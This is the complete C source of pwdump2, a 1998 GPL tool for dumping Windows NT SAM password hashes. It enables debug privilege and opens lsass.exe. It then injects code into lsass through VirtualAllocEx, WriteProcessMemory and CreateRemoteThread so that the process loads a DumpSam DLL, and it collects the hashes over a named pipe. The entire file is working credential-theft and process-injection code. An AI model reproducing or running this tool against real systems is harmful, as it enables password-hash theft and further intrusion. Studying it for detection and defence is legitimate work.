/***************************************************************************
 * 
 * File:    pwdump2.c
 * 
 * Purpose: dump the password hashes from the NT SAM.
 * 
 * Date:    Sun Jun 07 12:46:59 1998
 * 
 * Copyright (c) 1998 Todd A. Sabin, all rights reserved
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 ***************************************************************************/
#ifdef NOT_FIXED
#include <windows.h>
#include <winnt.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>

#include "pwdump2.h"


//
// Prototypes
//
int EnableDebugPriv (void);
void InjectDll (HANDLE hProc);
void ReceiveOutput (HANDLE hEvent);


void
Usage (char *app)
{
    printf ("\n\
Pwdump2 - dump the SAM database.\n\
Usage: %s <pid of lsass.exe>\n", app);
    exit (1);
}



int
main (int argc, char *argv[])
{
    HANDLE hLsassProc;
    HANDLE hReceiveThread;
    HANDLE hEvent;
    DWORD dwIgnored;

    if (argc != 2)
    {
        Usage (argv[0]);
    }

    //
    // Enable the debug privilege
    //
    if (EnableDebugPriv () != 0)
    {
        fprintf (stderr, "Failed enabling Debug privilege.  Proceeding anyway\n");
    }

    //
    // Open lsass
    //
    hLsassProc = OpenProcess (PROCESS_ALL_ACCESS, FALSE, atoi (argv[1]));
    if (hLsassProc == 0)
    {
        fprintf (stderr, "Failed to open lsass.  Exiting\n");
        exit (1);
    }

    //
    // Prepare the receive the output
    //
    hEvent = CreateEvent (NULL, 0, 0, NULL);
    hReceiveThread = CreateThread (NULL, 0,
                                   (LPTHREAD_START_ROUTINE) ReceiveOutput,
                                   hEvent, 0, &dwIgnored);
    if (!hReceiveThread)
    {
        fprintf (stderr, "Failed to create receiving thread.  Exiting\n");
        exit (1);
    }

    //
    // Wait for the child thread to create the pipe
    //
    if (WaitForSingleObject (hEvent, 10000) != ERROR_SUCCESS)
    {
        fprintf (stderr, "Failed starting listen on pipe.  Exiting\n");
        exit (1);
    }

    //
    // Inject the dll
    //
    InjectDll (hLsassProc);


    //
    // Wait for our child thread
    //
    WaitForSingleObject (hReceiveThread, INFINITE);
    getch();
    return 0;
}



//
// Try to enable the debug privilege
//
int
EnableDebugPriv (void)
{
    HANDLE hToken = 0;
    DWORD dwErr = 0;
    TOKEN_PRIVILEGES newPrivs;

    if (!OpenProcessToken (GetCurrentProcess (),
                           TOKEN_ADJUST_PRIVILEGES,
                           &hToken))
    {
        dwErr = GetLastError ();
        fprintf (stderr, "Unable to open process token: %08x\n", dwErr);
        goto exit;
    }

    if (!LookupPrivilegeValue (NULL, SE_DEBUG_NAME,
                               &newPrivs.Privileges[0].Luid))
    {
        dwErr = GetLastError ();
        fprintf (stderr, "Unable to lookup privilege: %08x\n", dwErr);
        goto exit;
    }

    newPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    newPrivs.PrivilegeCount = 1;
    
    if (!AdjustTokenPrivileges (hToken, FALSE, &newPrivs, 0, NULL, NULL))
    {
        dwErr = GetLastError ();
        fprintf (stderr, "Unable to adjust token privileges: %08x\n", dwErr);
        goto exit;
    }

 exit:
    if (hToken)
        CloseHandle (hToken);

    return dwErr;
}


//
// This is the function used to load the dll in lsass
//
static DWORD
RemoteFunction (REMOTE_INFO *pInfo)
{
    HINSTANCE hDll;
    pDumpSam_t pDumpSam;
    int rc = -1;

    hDll = pInfo->pLoadLibrary (pInfo->szDllName);
    if (hDll != NULL)
    {
        pDumpSam = (pDumpSam_t) pInfo->pGetProcAddress (hDll,
                                                        pInfo->szProcName);
        if (pDumpSam != 0)
        {
            rc = pDumpSam (pInfo->szPipeName);
        }
        pInfo->pFreeLibrary (hDll);
    }
    return rc;
}
//
// This is just a dummy used to get the address after RemoteFunction
//
static void
DummyFunc (void)
{
    return;
}


void
InjectDll (HANDLE hProc)
{
    DWORD dwFuncSize;
    DWORD dwBytesToAlloc;
    LPVOID pRemoteAlloc = NULL;
    REMOTE_INFO remInfo;
    HINSTANCE hKernel32;
    CHAR szDllName[MAX_PATH];
    DWORD dwBytesWritten;
    HANDLE hRemoteThread = 0;
    DWORD dwIgnored;


    //
    // Prepare the info to send across
    //
    hKernel32 = LoadLibrary ("Kernel32");
    remInfo.pLoadLibrary = (pLoadLib_t) GetProcAddress (hKernel32, "LoadLibraryA");
    remInfo.pGetProcAddress = (pGetProcAddr_t) GetProcAddress (hKernel32, "GetProcAddress");
    remInfo.pFreeLibrary = (pFreeLib_t) GetProcAddress (hKernel32, "FreeLibrary");

    GetModuleFileName (NULL, szDllName, sizeof (szDllName));
    strcpy (strrchr (szDllName, '\\') + 1, "SamDump.dll");
    strncpy (remInfo.szDllName, szDllName, sizeof (remInfo.szDllName));
    strncpy (remInfo.szProcName, "DumpSam", sizeof (remInfo.szProcName));
    _snprintf (remInfo.szPipeName, sizeof (remInfo.szPipeName),
               "\\\\.\\pipe\\pwdump2-%d", GetCurrentProcessId ());

    //
    // Determine amount of memory to allocate
    //
    dwFuncSize = (DWORD)DummyFunc - (DWORD)RemoteFunction;
    dwBytesToAlloc = dwFuncSize + sizeof (REMOTE_INFO) + 4;

    //
    // Allocate memory in remote proc
    //
    pRemoteAlloc = VirtualAllocEx (hProc, NULL, dwBytesToAlloc,
                                   MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteAlloc == NULL)
    {
        fprintf (stderr, "VirtualAllocEx failed: %d\n",
                 GetLastError ());
        return;
    }
    
    //
    // Write data to the proc
    //
    if (!WriteProcessMemory (hProc, pRemoteAlloc, &remInfo, sizeof (remInfo),
                             &dwBytesWritten))
    {
        fprintf (stderr, "WriteProcessMemory failed: %d\n",
                 GetLastError ());
        goto exit;
    }

    //
    // Write code to the proc
    //
    if (!WriteProcessMemory (hProc,
                             (PBYTE)pRemoteAlloc + sizeof (REMOTE_INFO) + 4,
                             (LPVOID)(DWORD)RemoteFunction, dwFuncSize,
                             &dwBytesWritten))
    {
        fprintf (stderr, "WriteProcessMemory failed: %d\n",
                 GetLastError ());
        goto exit;
    }

    //
    // Create the remote thread
    //
    hRemoteThread = CreateRemoteThread (hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)((PBYTE) pRemoteAlloc + sizeof (REMOTE_INFO) + 4),
                                        pRemoteAlloc, 0, &dwIgnored);
    if (!hRemoteThread)
    {
        fprintf (stderr, "CreateRemoteThread failed: %d\n",
                 GetLastError ());
        goto exit;
    }

    //
    // Wait for the thread
    //
    WaitForSingleObject (hRemoteThread, INFINITE);

 exit:
    if (hRemoteThread)
        CloseHandle (hRemoteThread);
    //
    // Free the memory
    //
    VirtualFreeEx (hProc, pRemoteAlloc, 0, MEM_RELEASE);
}



//
// This function receives the output from lsass via a named pipe
//
void
ReceiveOutput (HANDLE hEvent)
{
    HANDLE hPipe;
    CHAR szPipeName[MAX_PATH];

    //
    // Create the pipe
    //
    _snprintf (szPipeName, sizeof (szPipeName),
               "\\\\.\\pipe\\pwdump2-%d", GetCurrentProcessId ());
    hPipe = CreateNamedPipe (szPipeName,
                             PIPE_ACCESS_INBOUND
                             | FILE_FLAG_WRITE_THROUGH,
                             PIPE_TYPE_BYTE | PIPE_WAIT,
                             1, DUMP_PIPE_SIZE, DUMP_PIPE_SIZE,
                             10000, NULL);
    if (!hPipe)
    {
        fprintf (stderr, "Failed to create the pipe: %d\n",
                 GetLastError ());
        return;
    }

    //
    // Tell the main thread we're ready to go
    //
    SetEvent (hEvent);

    if (ConnectNamedPipe (hPipe, NULL)
        || (GetLastError () == ERROR_PIPE_CONNECTED))
    {
        BYTE buff[DUMP_PIPE_SIZE+1];
        DWORD dwRead;
        DWORD dwErr = ERROR_SUCCESS;

        do
        {
            if (ReadFile (hPipe, buff, sizeof (buff) -1, &dwRead, NULL))
            {
                buff[dwRead] = '\0';
                printf ("%s", buff);
            }
            else
            {
                dwErr = GetLastError ();
            }
        } while (dwErr != ERROR_BROKEN_PIPE);
    }
    else
    {
        fprintf (stderr, "Failed to connect the pipe: %d\n",
                 GetLastError ());
        CloseHandle (hPipe);
        return;
    }
    DisconnectNamedPipe (hPipe);
    CloseHandle (hPipe);
    return;
}
#endif